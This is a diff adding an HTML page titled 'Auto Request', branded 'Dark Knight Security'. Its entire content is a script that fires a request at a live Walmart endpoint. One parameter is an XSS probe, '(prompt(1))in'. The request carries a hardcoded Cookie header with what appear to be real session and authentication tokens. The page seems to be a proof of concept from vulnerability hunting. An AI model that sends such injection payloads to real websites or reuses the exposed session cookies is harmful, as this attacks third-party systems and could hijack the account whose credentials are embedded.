@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Request</title>
+</head>
+<body>
+    <h1>Welcome to Dark Knight Security</h1>
+
+    <script>
+        // URL and parameters for the request
+        const url = "https://tap.walmart.com/v1/tapframe";
+        const params = new URLSearchParams({
+            department: "Sports & Outdoors",
+            category: "Bikes",
+            subcategory: "Bike Apparel & Footwear",
+            department_id: "4125",
+            category_id: "1081404",
+            subcategory_id: "7258752",
+            item_ids: "%22(prompt(1))in%22",
+            host: "https://www.walmart.com/search?q=xss"
+        });
+
+        // Create the XMLHttpRequest object
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", `${url}?${params.toString()}`, true);
+
+        // Set the necessary headers
+        xhr.setRequestHeader("Host", "tap.walmart.com");
+        xhr.setRequestHeader("Cookie", "_gcl_au=1.1.1804999454.1725122464; s_fid=613B36F46A16F871-238BA335557049B9; _ga_L62JPMKG3T=GS1.1.1725129845.3.0.1725129845.60.0.0; _ga=GA1.1.376170706.1725122486; _hjSessionUser_1092039=eyJpZCI6IjllZWU1ODNiLTE0NDEtNWQ3ZC04YjFjLThkZDZkYWIyMzQ3ZSIsImNyZWF0ZWQiOjE3MjUxMjI0OTEyMjksImV4aXN0aW5nIjp0cnVlfQ==; _fbp=fb.1.1725122491405.363807819317912187; _ga_P7GTJPHL8V=GS1.1.1725129845.3.0.1725129845.60.0.0; _ga_4QDNH1LW4C=GS1.1.1725129845.3.0.1725129845.0.0.0; _mkto_trk=id:233-KML-790&token:_mch-walmart.com-1725133349530-50004; _ga_2NH0BW5GHR=GS1.1.1725136670.2.1.1725137810.34.0.0; ajs_anonymous_id=1b3a5fa8-2822-49fe-9b02-e31f4171c744; analytics_session_id=1725136675754; analytics_session_id.last_access=1725137812185; _uetvid=2b9c8ce067d111efb20a671a84354283|13m64of|1725137821862|3|1|bat.bing.com/p/insights/c/t; vtc=fH4BcttgoIFQcJQARxH5vg; xptwj=uz:fabab999ec30612a0aea:cKGCqWWzyR7PFZO0OhJyoeU2PNFBvvhalcjXTSLL1ztirYdOg4PqfHyhWyFlOuYltNGPrSObGKH7p/8pVEeeaooOOscHyMLOuLShoA7SCs9u/UWUIcUTr1/6n//qwCfB5K1gTje0lzYlbdW7rh7XV+j8eC7Gei6FSIUsLbPfe8cvkZ7XTcZc/Qs=; AID=wmlspartner%3D0%3Areflectorid%3D0000000000000000000000%3Alastupd%3D1725189465734; com.wm.reflector="reflectorid:0000000000000000000000@lastupd:1725692072000@firstcreate:1725189465734"; ACID=a87b1724-b99a-43b2-8ba8-ed6627f430af; hasACID=true; _m=9; _pxvid=cfae2236-6853-11ef-9b58-2debedd7311b; io_id=cc414dde-7512-4a07-a56e-f095a3d94aff; if_id=FMEZARSFslB05HhqSLCAie6cE0MpqcXg8UnQw5wUAI3JpzMUvE1MYMHjFBpR/nhySCkypEi7FwlEeYudk1oI0hhhrPCTlSQxthItMkt+EJPf1OVMuj1QnrAHrm/nMpkSJavoWSCROi0qxhnw9EOJsSfgtIOrT/DBMI4vabQZxi13TtjW9qLq9rVE/iijlMdCcm8GUiAKIZriuD24fw==; QuantumMetricUserID=5512c461079cdf00939f9867019260b4; AMCV_B5281C8B53309CEF0A490D4D%40AdobeOrg=1176715910%7CMCIDTS%7C19968%7CMCMID%7C52524364451163420724197550170495325037%7CMCAAMLH-1725794708%7C3%7CMCAAMB-1725794708%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1725197108s%7CNONE%7CMCSYNCSOP%7C411-19975%7CvVersion%7C5.4.0; mbox=PC#c8f97449d32943b4a9907a7391cc0bb1.38_0#1788437512|session#962ebb3ef5fb4f80b5a454375fa2df00#1725194572; __pxvid=dca170ef-6854-11ef-a936-0242ac120002; s_nr30=1725192712906-Repeat; s_tslv=1725192712907; _tracking_consent=%7B%22con%22%3A%7B%22CMP%22%3A%7B%22a%22%3A%22%22%2C%22m%22%3A%22%22%2C%22p%22%3A%22%22%2C%22s%22%3A%22%22%7D%7D%2C%22v%22%3A%222.1%22%2C%22region%22%3A%22BDC%22%2C%22reg%22%3A%22%22%7D; _shopify_y=5e215690-c466-455f-a9cf-483193f6765e; _orig_referrer=; _landing_page=%2F; _ga_0Y287MYR81=GS1.1.1725191103.1.1.1725191595.0.0.0; g=1; ak_bmsc=38C5B0F241242F8BAB845F60CA8D331B~000000000000000000000000000000~YAAQzas0F9ufF56RAQAAObJByxnEpSHM9LM0apenjnw6ierReZQeldYapXaUFskPoDAmm9V9POV3wRUSt2U92NXt776Oxk5fnbMY2uQQFG00mAz7paU3ZO5XOBUCBwqKnfj2jT38u5adlOlp1MOabt/RM8hjy7zA0nIJd6oaLKPxiPQ4PW35T+CCZ/blbCvgSXRwQlI7mccVrA/VOpB+ejQK6Wy1jOWAgxCao+rmYJV02fYPZ90Xsx8gPEFG61SGEoj94k1CIyzsO0sg0LBIqTWrp5B7Km5LHhl7bVa6kgC9uduQBqDWcc78kTZl5b+FqT2PzecmqehMGa32q+XiWh6xuCNan6I/nfczKXuvXaWHXpLtK7uwWy0dWATEt2ZGPg==; bstc=YKSM0PgDE2aFTI483q-WFE; pxcts=d3de4266-6ce5-11ef-86a2-db73d18c67ef; _pxde=5c54cf27c7327286f6ebec691bfc950e2a5d5e06263e88fc32db4492d056cbe1:eyJ0aW1lc3RhbXAiOjE3MjU2OTIwNzMwMTN9; TS2a5e0c5c027=080d108576ab2000e82436b60d4262e44d1f80f62642fe3fbec0620816581f07b12692ecf5b4a4f608a63db56e11300001bb2f7d6442be3ffe2d1298d9477267a6ea517a07dfb8fcd01ce016042b39fbffccae841b7848a6d2de1e6f265ce3cf; auth=MTAyOTYyMDE4AanIH5ebglq45x%2FR3dW3mG4J7vo6pdai%2BHwP3dDRALADlt0eaA7V%2F%2FFrVBXw%2F8PXjt9Wf4BhdHl6Z273anhImxH1Xvx8jKPkYCiWA94sBpHIRYA5PA3SsNlDIjXvakw%2B767wuZloTfhm7Wk2KcjygjFwIZIekXC4wlSRgDWHtlx%2Fec4GSdzDGSf5rcHEt49S2JX79mDXwE0o1k%2FrOGpOyrbpL8GhMhoeKPBPdNxitBsUMk70P8glgOEpLOprhDfMJ0tmvH1FCaN9tZDh4SCrHdNM0iogAjcdE%2BxV9RzQJ9m6ATFxcVANIU2TJ0ubUXfV8vQAkkNMRWyy8vOszZevQpJfgikLPVMGF8dUzj5odAbHJmCyvrVIXlL%2BjvkYV9RCgQxGcCO4ZdsXoujEkXFoCUjyrOXbKKhH072NS%2FW0j%2FU%3D; mobileweb=0; xptc=assortmentStoreId%2B3081~_m%2B9; xpth=x-o-mart%2BB2C~x-o-mverified%2Bfalse; xpa=-5Ta8|1nsSp|5F_NB|5_Bo3|8jzXo|9TbBT|B2LMP|CBwr_|ELwUx|GuLdJ|HZUxo|NbX17|OIg9i|Pr4Jt|QEEGR|SD-jV|VW1Ft|Zz8r-|_LXoY|_Ug75|a-NrR|eV1U2|fdm-7|hWA55|iLKla|jHZ2T|nHtvF|oAd8a|rn8iL|t0Ynd|uvnI5|wbqKt|xDsZx|xzcPS|yeKZk|ywGVY|zm5lH; xpm=1%2B1725691997%2BfH4BcttgoIFQcJQARxH5vg~%2B0; exp-ck=-5Ta815_Bo319TbBT3CBwr_1ELwUx1GuLdJ1HZUxo3NbX172OIg9i1_Ug751fdm-71hWA551iLKla1jHZ2T5oAd8a2rn8iL3uvnI51xDsZx1zm5lH2; xptwg=2698456751:16A7F09C412B110:38631BC:E9C39A32:B7A83D66:984342BE:; TS01a90220=01d80600842ffa6d141d256349e8ad45835d25f3cfaf6e6a92abbfc8d4c325f2d40330cd2fc2faa536153a09fae69b0278d9e13a3b; bm_sv=34E1F6FC7FA1411DC4CD3C55D24EA8D2~YAAQzas0F/KfF56RAQAAB1RDyxnaQzYVGoODzjjz9Zzdym/fljZSe6khuJObxbnTQrS4J93Ba5WNt3i9tciJCsK+Mzbok7v2rtXAGSxMm1PQz5uDx/2ZxumqfM4vqkbkgTfNFSR8FQavKsMGgA/maL+IhML4PL4G5YmH3jEF3L4BGm0bwBtTOQyXarCdOkLjVVbrgU9XRzLoivpcoNx+tC4zqrdm9BTba4ATJtltLJ7+p9u+Yhi5ndhKBCwJfzXD6rA=~1; bm_mi=8CBBCA5918344BE78B29BACE72DE4F84~YAAQtag7F9klrJWRAQAA/VFDyxmFaWvm6nyaX/sQ2BTyEyTWsnl1DiDtFmjyaJtSkwqBR7QZiBKHEMjDPZqbixcHledmf4gWYQKA9dcVkMt5lPHXGL5gQuGRYJrnmze0Yv5a0MWlT5LGeSwN/asz/4RK3+hQamOOL0YY/uPn+gFLPk2cMB82JOFV0Rf/4fKR25GHRe3vYOZ681P4jHtDoP3UAlj6+OGXdkzRgu8k7FPvDnc9Eo0mM8Y7o0O2ic9Xfd+lCOYoFFLZivbYsTUI+ciBpPDJwEetqvhDFUpj9kbdlDUSsYapX60WFCOoOxHf+GfafZBNHdbjOnwFaYGdZ6Ez+EcLjy23ZDDsIT0SpDbf26BcFLfPIOBbB4vI7ibZRTXORC0VX5U40AYoKQ==~1; _px3=0ebb7d2dc3370483a6a7244e01072aee14f194a3d3d76863b1d4dd37cf454cca:JkJH/PA9FWctLVG4ntkxpFX51bT/RFxpf2XMFeVCrOz2anS60FCRl+0nn+5O1PfL/020zZHwr7SP7QQwGHCVeQ==:1000:ysGXeEqOY+9pHrTjeEJ/BUIt6giO2rcT59IWCEPLju4fDDAqQHFGcu0QO8zPwnBGaH/JZaML2yBAguJ+5clCeKmAiS0PbaNgGjYLe6QncTn8XrzibLtCsd3YorSSWQaS/FFlPi0ODGbFSuBJ/IDFS/tVQK+ANhUtInIWOzlEp4nfMfkXndPaHjzV/Rm4L9J0vziQ4wkhm8HCIc9WKMCSmISZyxidDZOdarW8EBYu420=; TS01f89308=0113844fa7ffd12ae496ef55388ba00652f20450f17a283f06939f26cbb8177f87bb8c375a79a3bbe8d5b343e8827782057c30be03");
+        xhr.setRequestHeader("Referer", "https://www.walmart.com/ip/7iDP-M2-Helmet-Matt-Black-Gloss-Black-XSS-52-55cm/966359160?classType=REGULAR&from=/search");
+        
+        // Send the request
+        xhr.send();
+
+        // Optional: Log when the request is sent
+        xhr.onload = function() {
+            if (xhr.status == 200) {
+                console.log("Request successful");
+            } else {
+                console.log("Request failed");
+            }
+        };
+    </script>
+</body>
+</html>
